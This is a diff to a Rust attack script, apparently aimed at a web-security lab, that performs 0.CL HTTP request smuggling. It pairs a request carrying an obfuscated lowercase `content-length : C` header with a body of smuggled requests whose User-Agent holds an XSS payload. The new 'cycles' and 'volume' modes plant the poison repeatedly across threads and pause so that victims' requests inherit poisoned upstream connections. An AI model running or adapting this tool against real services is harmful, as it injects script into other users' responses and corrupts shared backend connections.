@@ -1,8 +1,8 @@
 #!/usr/bin/env rust-script
 //! name: pool_window
-//! description: 0.CL 上游池回收时序探针 - 先在同一前端打毒(A 带全小写 `content-length : C` 让后端吃体,B 带早答 gadget 头块 + filler + 截断的 smuggled 请求),随即优雅关闭或闲置攻击连接,再以全新连接在给定延迟档发带信标查询串的探针,逐档分类回执(状态行/字节/残留帖子页/XSS 载荷回显/SVG 缺失)判定「毒化上游连接能否被后到连接继承」;plant 模式按同一毒化反复种植并等待受害者请求补完,末尾读横幅。
-//! version: 1.0.0
-//! args: <base-url> --mode sweep|window|plant [--c N] [--c-delta 35] [--cl-from N] [--cl-to N] [--cl-step N] [--filler-crlf N] [--delays 500,1000,2000,3000,5000,8000,12000] [--reps N] [--rounds N] [--hold close|idle|both] [--post-id 1] [--seed-id 2] [--ua PAYLOAD] [--salt S] [--gadget-prefix P] [--cache-path P] [--drain-ms 900] [--probe-ms 3000] [--probe-retries 2] [--victim-wait-ms 6000] [--banner] [--dump] [--selftest]
+//! description: 0.CL 上游池回收时序探针 - 在同一前端打毒(A 带全小写 `content-length : C` 让后端吃体,B 的头块被吃、体内依次是 filler + 两条完整请求(revealed 与盈余发,都带载荷 UA) + 一条截断的 smuggled 请求),随即优雅关闭或闲置攻击连接,再以全新连接在给定延迟档发带信标查询串的探针,逐档分类回执(状态行/字节/首末 Content-Type/残留帖子页/XSS 载荷回显/SVG 缺失)判定「毒化上游连接能否被后到连接继承」;plant 按同一毒化反复种植;cycles 先静默过上游 keepalive 超时再单发种植(空池时 A/B 只能同连接);volume 多线程量击,可 --c-list 轮转偏移电池、首发命中即 --cool-after-prime-ms 全局静默把首取机会留给受害者,末尾读横幅。
+//! version: 1.1.0
+//! args: <base-url> --mode sweep|window|plant|cycles|volume [--c N] [--c-list a,b,c] [--c-delta 35] [--cl-from N] [--cl-to N] [--cl-step N] [--filler-crlf N] [--delays 500,1000,2000,3000,5000,8000,12000] [--reps N] [--rounds N] [--seconds N] [--workers N] [--jitter-ms N] [--hold close|idle|both] [--post-id 1] [--seed-id 2] [--ua PAYLOAD] [--salt S] [--gadget-prefix P] [--cache-path P] [--idle-secs N] [--settle-secs N] [--cool-after-prime-ms N] [--banner-every N] [--probe-every N] [--probe-delays ms,ms] [--probe-if-primed] [--drain-ms 900] [--probe-ms 3000] [--probe-retries 2] [--victim-wait-ms 6000] [--brief] [--banner] [--dump] [--no-read] [--selftest]
 //! keywords: smuggling, 0cl, desync, response-queue, pool, reuse, timing, xss, tls
 //!
 //! ```cargo
@@ -14,9 +14,11 @@
 
 use pi_rust_lib::serde_json::{json, Value};
 use pi_rust_lib::timeout;
+use std::collections::HashMap;
 use std::io::{Read, Write};
 use std::net::TcpStream;
-use std::sync::Arc;
+use std::sync::atomic::{AtomicU64, Ordering};
+use std::sync::{Arc, Mutex};
 use std::time::{Duration, Instant};
 use url::Url;
 
@@ -94,12 +96,28 @@ fn classify(buf: &[u8], ua: &str) -> Value {
     let post_page = text.contains("Leave a comment") || text.contains("name=\"userAgent\"") || text.contains("name=userAgent");
     let total = text.chars().count();
     let tail: String = text.chars().skip(total.saturating_sub(300)).collect();
+    // 末条 Content-Type:两发以上时它就是第二个响应的类型(text/html = 残留被当成帖子页)
+    let mut ct = String::new();
+    let mut ct1 = String::new();
+    for (off, _) in text.match_indices("Content-Type:") {
+        let rest = &text[off + 13..];
+        let end = rest.find("\r\n").unwrap_or(rest.len());
+        let v = rest[..end].trim();
+        if !v.is_empty() {
+            if ct1.is_empty() {
+                ct1 = v.to_string();
+            }
+            ct = v.to_string();
+        }
+    }
     json!({
         "bytes": buf.len(),
         "statuses": statuses,
         "status_count": statuses.len(),
         "post_page": post_page,
         "xss_hit": text.contains("<script>alert"),
+        "ct": ct,
+        "ct1": ct1,
         "svg": text.contains("<svg") || text.contains("image/svg"),
         "ua_echo": !ua.is_empty() && text.contains(ua),
         "head": text.chars().take(120).collect::<String>(),
@@ -149,9 +167,12 @@ struct Ctx {
 /// by filler CRLFs, a complete revealed request and a truncated smuggled one.
 fn build(ctx: &Ctx, c: u64, tag: &str) -> (String, String, usize, usize) {
     let t = format!("GET /post?postId={} HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}", ctx.post_id, ctx.host, ctx.ua);
-    let r = format!("GET /post?postId={} HTTP/1.1\r\nHost: {}\r\nConnection: keep-alive\r\n\r\n", ctx.seed_id, ctx.host);
+    // r 是「revealed」:它的响应会被前端当 B 的响应收掉;r2 是盈余那发(其响应应落在后端队列里,
+    // 由该连接上后到的请求取走)。两者都带载荷 UA,因为哪一发被配对无法预先确定。
+    let r = format!("GET /post?postId={} HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}\r\nConnection: keep-alive\r\n\r\n", ctx.seed_id, ctx.host, ctx.ua);
+    let r2 = format!("GET /post?postId={} HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}\r\nConnection: keep-alive\r\n\r\n", ctx.post_id, ctx.host, ctx.ua);
     let filler = "\r\n".repeat(ctx.filler_crlf);
-    let body = format!("{filler}{r}{t}");
+    let body = format!("{filler}{r}{r2}{t}");
     let m = body.len();
     let gurl_a = format!("{}{}{}", ctx.gadget, ctx.salt, tag);
     let gurl_b = format!("{}?b={}{}", ctx.cache_path, ctx.salt, tag);
@@ -159,6 +180,48 @@ fn build(ctx: &Ctx, c: u64, tag: &str) -> (String, String, usize, usize) {
     let a = format!("GET {gurl_a} HTTP/1.1\r\nHost: {}\r\ncontent-length : {c}\r\nConnection: keep-alive\r\n\r\n", ctx.host);
     let b = format!("{hdr_b}{body}");
     (a, b, hdr_b.len(), m)
+}
+
+/// One plant attempt: A (early-answer gadget + hidden lowercase `content-length : C`)
+/// followed immediately by B (header block + filler/revealed/truncated body). Shared by
+/// every mode and safe to call from worker threads.
+fn plant_once(
+    ctx: &Ctx,
+    port: u16,
+    drain_ms: u64,
+    c_opt: Option<u64>,
+    c_delta: u64,
+    tag: &str,
+    c_over: Option<u64>,
+) -> Result<(Value, Tls, u64), String> {
+    let (_, _, hl, _) = build(ctx, 0, tag);
+    let cc = c_over.or(c_opt).unwrap_or(hl as u64 + c_delta);
+    let (a, b, _, _) = build(ctx, cc, tag);
+    let mut s = connect(&ctx.host, port)?;
+    let both = format!("{a}{b}");
+    s.write_all(both.as_bytes()).map_err(|e| e.to_string())?;
+    let _ = s.flush();
+    let resp = drain(&mut s, drain_ms, 300);
+    Ok((classify(&resp, &ctx.ua), s, cc))
+}
+
+fn probe_once(ctx: &Ctx, port: u16, probe_ms: u64, path: &str, beacon: &str) -> Result<(Value, bool), String> {
+    let mut s = connect(&ctx.host, port)?;
+    let pr = probe_req(ctx, path, beacon);
+    s.write_all(pr.as_bytes()).map_err(|e| e.to_string())?;
+    let _ = s.flush();
+    let b = drain(&mut s, probe_ms, 500);
+    let empty = b.is_empty();
+    Ok((classify(&b, &ctx.ua), empty))
+}
+
+fn read_page(ctx: &Ctx, port: u16, read_ms: u64, path: &str) -> Result<Value, String> {
+    let mut s = connect(&ctx.host, port)?;
+    let req = format!("GET {path} HTTP/1.1\r\nHost: {}\r\nConnection: close\r\n\r\n", ctx.host);
+    s.write_all(req.as_bytes()).map_err(|e| e.to_string())?;
+    let _ = s.flush();
+    let b = drain(&mut s, read_ms, 400);
+    Ok(classify(&b, &ctx.ua))
 }
 
 fn probe_req(ctx: &Ctx, path: &str, beacon: &str) -> String {
@@ -176,6 +239,7 @@ fn banner_solved(host: &str, port: u16, _ctx: &Ctx) -> Value {
             json!({
                 "bytes": b.len(),
                 "is_solved_class": text.contains("is-solved"),
+                "post_page": text.contains("Leave a comment") || text.contains("name=userAgent"),
                 "congrats": text.contains("Congratulations") || text.contains("congratulations"),
             })
         }
@@ -238,6 +302,7 @@ fn main() {
     let probe_ms: u64 = arg_num(&argv, "--probe-ms", 3000);
     let victim_wait_ms: u64 = arg_num(&argv, "--victim-wait-ms", 6000);
     let dump = argv.iter().any(|a| a == "--dump");
+    let brief = argv.iter().any(|a| a == "--brief");
     let no_read = argv.iter().any(|a| a == "--no-read");
     let delays: Vec<u64> = arg_val(&argv, "--delays")
         .unwrap_or_else(|| "500,1000,2000,3000,5000,8000,12000".to_string())
@@ -268,15 +333,7 @@ fn main() {
         v.split(',').filter_map(|x| x.trim().parse().ok()).collect()
     });
     let plant = |ctx: &Ctx, tag: &str, c_over: Option<u64>| -> Result<(Value, Tls, u64), String> {
-        let (_, _, hl, _) = build(ctx, 0, tag);
-        let cc = c_over.or(c_opt).unwrap_or(hl as u64 + c_delta);
-        let (a, b, _, _) = build(ctx, cc, tag);
-        let mut s = connect(&ctx.host, port)?;
-        let both = format!("{a}{b}");
-        s.write_all(both.as_bytes()).map_err(|e| e.to_string())?;
-        let _ = s.flush();
-        let resp = drain(&mut s, drain_ms, 300);
-        Ok((classify(&resp, &ctx.ua), s, cc))
+        plant_once(ctx, port, drain_ms, c_opt, c_delta, tag, c_over)
     };
 
     if mode == "sweep" {
@@ -309,8 +366,13 @@ fn main() {
                         if hit {
                             boundaries.push(c);
                         }
-                        rows.push(json!({"c": c, "rep": rep, "hdr_len": hdr_len, "body_len": body_len,
-                            "post_page": v["post_page"], "xss_hit": v["xss_hit"], "statuses": v["statuses"], "bytes": v["bytes"], "head": v["head"], "tail": v["tail"]}));
+                        let mut row = json!({"c": c, "rep": rep, "hdr_len": hdr_len, "body_len": body_len,
+                            "post_page": v["post_page"], "xss_hit": v["xss_hit"], "statuses": v["statuses"], "bytes": v["bytes"], "ct": v["ct"], "ct1": v["ct1"]});
+                        if !brief {
+                            row["head"] = v["head"].clone();
+                            row["tail"] = v["tail"].clone();
+                        }
+                        rows.push(row);
                     }
                     Err(e) => rows.push(json!({"c": c, "rep": rep, "error": e})),
                 }
@@ -464,6 +526,284 @@ fn main() {
             "pool_window",
             out,
             "traces>0 means a fresh connection saw poisoned-upstream bytes (pool inheritance); traces==0 across all delays means the upstream binding is 1:1",
+        )
+        .unwrap_or(());
+        return;
+    }
+
+    if mode == "cycles" {
+        // 空池-种植周期:先静默 idle-secs 让前端把闲置上游连接超时丢掉(池空),再种一发——
+        // 此时 A 与 B 只能落在同一条上游连接上,且该连接是池里唯一的,受害者下一次访问
+        // 必然复用它。--probe-if-primed 时即使已种成也发探针(学窗口);默认种成则静默等受害者。
+        let rounds: u64 = arg_num(&argv, "--rounds", 6);
+        let idle_secs: u64 = arg_num(&argv, "--idle-secs", 62);
+        let settle_secs: u64 = arg_num(&argv, "--settle-secs", 12);
+        let probe_if_primed = argv.iter().any(|a| a == "--probe-if-primed");
+        let mut rows: Vec<Value> = Vec::new();
+        let mut priming_c: Vec<u64> = Vec::new();
+        let mut solved = false;
+        let mut banner_last = Value::Null;
+        let mut stop_reason = String::new();
+        for round in 0..rounds {
+            timeout::check();
+            if idle_secs > 0 {
+                std::thread::sleep(Duration::from_secs(idle_secs));
+            }
+            let tag = format!("{:0width$x}", counter, width = tag_len);
+            counter += 1;
+            let c_this = c_list.as_ref().map(|l| l[round as usize % l.len()]);
+            let mut row = json!({"round": round, "idle_secs": idle_secs});
+            let mut primed = false;
+            match plant(&ctx, &tag, c_this) {
+                Ok((cls, claim, c_used)) => {
+                    primed = cls["post_page"].as_bool().unwrap_or(false)
+                        || cls["xss_hit"].as_bool().unwrap_or(false);
+                    if primed {
+                        priming_c.push(c_used);
+                    }
+                    row["c_used"] = json!(c_used);
+                    row["plant"] = cls;
+                    row["primed"] = json!(primed);
+                    graceful_close(claim);
+                }
+                Err(e) => {
+                    row["error"] = json!(e);
+                }
+            }
+            let mut probes: Vec<Value> = Vec::new();
+            if !primed || probe_if_primed {
+                for d in &delays {
+                    timeout::check();
+                    std::thread::sleep(Duration::from_millis(*d));
+                    let beacon = format!("{}c{round}d{d}", ctx.salt);
+                    match probe_once(&ctx, port, probe_ms, &ctx.cache_path, &beacon) {
+                        Ok((mut v, empty)) => {
+                            v["delay_ms"] = json!(d);
+                            v["empty"] = json!(empty);
+                            v["clean"] = json!(!empty && probe_clean(&v));
+                            probes.push(v);
+                        }
+                        Err(e) => probes.push(json!({"delay_ms": d, "error": e})),
+                    }
+                }
+            }
+            row["probes"] = json!(probes.clone());
+            row["probes_skipped"] = json!(primed && !probe_if_primed);
+            if settle_secs > 0 {
+                std::thread::sleep(Duration::from_secs(settle_secs));
+            }
+            let b = banner_solved(&host, port, &ctx);
+            if b["is_solved_class"].as_bool().unwrap_or(false) || b["congrats"].as_bool().unwrap_or(false) {
+                solved = true;
+            }
+            row["banner"] = b.clone();
+            banner_last = b;
+            rows.push(row);
+            let surplus = probes.iter().any(|p| p["ct1"].as_str() == Some("text/html"));
+            if solved {
+                stop_reason = "banner".to_string();
+                break;
+            }
+            if surplus {
+                stop_reason = "surplus".to_string();
+                break;
+            }
+        }
+        out["mode"] = json!("cycles");
+        out["rows"] = json!(rows);
+        out["priming_c"] = json!(priming_c);
+        out["solved"] = json!(solved);
+        out["stop_reason"] = json!(stop_reason);
+        out["banner"] = banner_last;
+        pi_rust_lib::report::success(
+            "pool_window",
+            out,
+            "priming_c lists the C values that planted a live poison; solved=true is the verdict",
+        )
+        .unwrap_or(());
+        return;
+    }
+
+    if mode == "volume" {
+        // 量击:多线程不间断种植,worker 内循环(单次调用跑完几千发),按节奏错峰探针收割,
+        // 定期读横幅;--probe-every 0 时纯种植(窗口已证时用),--banner-every 控制读横幅节奏。
+        let workers: u64 = arg_num(&argv, "--workers", 6);
+        let seconds: u64 = arg_num(&argv, "--seconds", 240);
+        let jitter_ms: u64 = arg_num(&argv, "--jitter-ms", 12);
+        let probe_every: u64 = arg_num(&argv, "--probe-every", 20);
+        let read_every: u64 = arg_num(&argv, "--read-every", 0);
+        let banner_every: u64 = arg_num(&argv, "--banner-every", 300);
+        let cool_ms: u64 = arg_num(&argv, "--cool-after-prime-ms", 0);
+        let banner_on_prime = argv.iter().any(|a| a == "--banner-on-prime");
+        let probe_delays: Vec<u64> = arg_val(&argv, "--probe-delays")
+            .unwrap_or_else(|| "300,900,2500".to_string())
+            .split(',')
+            .filter_map(|v| v.trim().parse().ok())
+            .collect();
+        let ctx_arc = Arc::new(ctx);
+        let counter = Arc::new(AtomicU64::new(0));
+        let plants = Arc::new(AtomicU64::new(0));
+        let primes = Arc::new(AtomicU64::new(0));
+        let traces = Arc::new(AtomicU64::new(0));
+        let post_hits = Arc::new(AtomicU64::new(0));
+        let hist = Arc::new(Mutex::new(HashMap::<String, u64>::new()));
+        let cprimes = Arc::new(Mutex::new(HashMap::<String, u64>::new()));
+        let cool = Arc::new(Mutex::new(None::<Instant>));
+        let samples = Arc::new(Mutex::new(Vec::<Value>::new()));
+        let banner = Arc::new(Mutex::new(Value::Null));
+        let deadline = Instant::now() + Duration::from_secs(seconds);
+        let mut handles = Vec::new();
+        for wid in 0..workers {
+            let ctx: Arc<Ctx> = Arc::clone(&ctx_arc);
+            let counter = Arc::clone(&counter);
+            let plants = Arc::clone(&plants);
+            let primes = Arc::clone(&primes);
+            let traces = Arc::clone(&traces);
+            let post_hits = Arc::clone(&post_hits);
+            let hist = Arc::clone(&hist);
+            let cprimes = Arc::clone(&cprimes);
+            let cool = Arc::clone(&cool);
+            let samples = Arc::clone(&samples);
+            let banner = Arc::clone(&banner);
+            let delays = probe_delays.clone();
+            let clist = c_list.clone();
+            handles.push(std::thread::spawn(move || {
+                let mut local: u64 = 0;
+                loop {
+                    timeout::check();
+                    if Instant::now() >= deadline {
+                        break;
+                    }
+                    // 冷却:刚种下一个可继承的毒时静默几秒,把首取机会留给受害者的周期访问
+                    let wait_ms: u64 = {
+                        let g = cool.lock().unwrap();
+                        match *g {
+                            Some(t) => {
+                                let now = Instant::now();
+                                if t > now { (t - now).as_millis() as u64 } else { 0 }
+                            }
+                            None => 0,
+                        }
+                    };
+                    if wait_ms > 0 {
+                        std::thread::sleep(Duration::from_millis(wait_ms.min(30000)));
+                        if banner_on_prime {
+                            let b = banner_solved(&ctx.host, port, &ctx);
+                            let solved = b["is_solved_class"].as_bool().unwrap_or(false)
+                                || b["congrats"].as_bool().unwrap_or(false);
+                            if solved {
+                                *banner.lock().unwrap() = json!({"at_plants": plants.load(Ordering::SeqCst), "solved": true, "raw": b});
+                                break;
+                            }
+                        }
+                        continue;
+                    }
+                    let n = counter.fetch_add(1, Ordering::SeqCst);
+                    let tag = format!("{:0width$x}", n, width = tag_len);
+                    let c_use: Option<u64> = clist.as_ref().map(|l| l[(n as usize) % l.len()]);
+                    match plant_once(&ctx, port, drain_ms, c_opt, c_delta, &tag, c_use) {
+                        Ok((cls, claim, c_used)) => {
+                            let primed = cls["post_page"].as_bool().unwrap_or(false)
+                                || cls["xss_hit"].as_bool().unwrap_or(false);
+                            if primed {
+                                primes.fetch_add(1, Ordering::SeqCst);
+                                let mut cp = cprimes.lock().unwrap();
+                                *cp.entry(format!("{c_used}")).or_insert(0) += 1;
+                                if cool_ms > 0 {
+                                    let mut g = cool.lock().unwrap();
+                                    *g = Some(Instant::now() + Duration::from_millis(cool_ms));
+                                }
+                            }
+                            {
+                                let key = format!("n{}|{}|{}", cls["status_count"], cls["ct1"], cls["ct"]);
+                                let mut h = hist.lock().unwrap();
+                                *h.entry(key).or_insert(0) += 1;
+                            }
+                            if primed {
+                                let mut s = samples.lock().unwrap();
+                                if s.len() < 12 {
+                                    s.push(json!({"kind": "prime", "tag": tag, "cls": cls.clone()}));
+                                }
+                            }
+                            graceful_close(claim);
+                        }
+                        Err(e) => {
+                            let mut h = hist.lock().unwrap();
+                            *h.entry(format!("err:{e}")).or_insert(0) += 1;
+                        }
+                    }
+                    plants.fetch_add(1, Ordering::SeqCst);
+                    local += 1;
+                    if probe_every > 0 && local % probe_every == 0 {
+                        for d in &delays {
+                            std::thread::sleep(Duration::from_millis(*d));
+                            let beacon = format!("{}v{}d{}", ctx.salt, n, d);
+                            if let Ok((v, empty)) = probe_once(&ctx, port, probe_ms, &ctx.cache_path, &beacon) {
+                                if !empty && !probe_clean(&v) {
+                                    traces.fetch_add(1, Ordering::SeqCst);
+                                    let mut s = samples.lock().unwrap();
+                                    if s.len() < 12 {
+                                        s.push(json!({"kind": "trace", "delay_ms": d, "cls": v}));
+                                    }
+                                }
+                            }
+                        }
+                    }
+                    if read_every > 0 && local % read_every == 0 {
+                        let path = format!("/post?postId={}", ctx.post_id);
+                        if let Ok(v) = read_page(&ctx, port, probe_ms, &path) {
+                            if v["post_page"].as_bool().unwrap_or(false) {
+                                post_hits.fetch_add(1, Ordering::SeqCst);
+                            }
+                        }
+                    }
+                    if banner_every > 0 && local % banner_every == 0 {
+                        let b = banner_solved(&ctx.host, port, &ctx);
+                        let solved = b["is_solved_class"].as_bool().unwrap_or(false)
+                            || b["congrats"].as_bool().unwrap_or(false);
+                        *banner.lock().unwrap() = json!({"at_plants": plants.load(Ordering::SeqCst), "solved": solved, "raw": b});
+                        if solved {
+                            break;
+                        }
+                    }
+                    if jitter_ms > 0 || wid > 0 {
+                        std::thread::sleep(Duration::from_millis(jitter_ms + (wid * 7) % 23));
+                    }
+                }
+            }));
+        }
+        for h in handles {
+            let _ = h.join();
+        }
+        let plant_n = plants.load(Ordering::SeqCst);
+        let prime_n = primes.load(Ordering::SeqCst);
+        let trace_n = traces.load(Ordering::SeqCst);
+        let banner_v = banner.lock().unwrap().clone();
+        let solved = banner_v["solved"].as_bool().unwrap_or(false);
+        let final_banner = banner_solved(&host, port, &ctx_arc);
+        let solved_final = solved
+            || final_banner["is_solved_class"].as_bool().unwrap_or(false)
+            || final_banner["congrats"].as_bool().unwrap_or(false);
+        out["mode"] = json!("volume");
+        out["workers"] = json!(workers);
+        out["seconds"] = json!(seconds);
+        out["probe_every"] = json!(probe_every);
+        out["probe_delays"] = json!(probe_delays);
+        out["plants"] = json!(plant_n);
+        out["primes"] = json!(prime_n);
+        out["probe_traces"] = json!(trace_n);
+        out["c_primes"] = json!(*cprimes.lock().unwrap());
+        out["cool_after_prime_ms"] = json!(cool_ms);
+        out["post_page_hits"] = json!(post_hits.load(Ordering::SeqCst));
+        out["hist"] = json!(*hist.lock().unwrap());
+        out["samples"] = json!(*samples.lock().unwrap());
+        out["banner"] = banner_v;
+        out["final_banner"] = final_banner;
+        out["solved"] = json!(solved_final);
+        pi_rust_lib::report::success(
+            "pool_window",
+            out,
+            "solved=true is the verdict; probe_traces>0 means the poison is inheritable at that delay",
         )
         .unwrap_or(());
         return;
